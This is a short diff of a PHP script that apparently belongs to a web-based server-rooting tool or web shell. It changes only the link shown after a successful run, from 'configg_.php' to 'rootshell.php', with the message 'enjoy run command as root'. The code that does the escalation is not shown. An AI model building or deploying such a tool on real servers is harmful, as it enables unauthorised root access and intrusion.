@@ -91,7 +91,7 @@ if(isset($_POST['gass'])) {
 				$makefile_process = process();
 				$make_sendcmd = sendcmd();
 				if($make_sendcmd) {
-					echo("w00t, <a href='configg_.php' target='_blank'>klik here</a> and enjoy run command as root ^_^");
+					echo("w00t, <a href='rootshell.php' target='_blank'>klik here</a> and enjoy run command as root ^_^");
 				}
 			} else {
 				print('Can\'t root this server!');
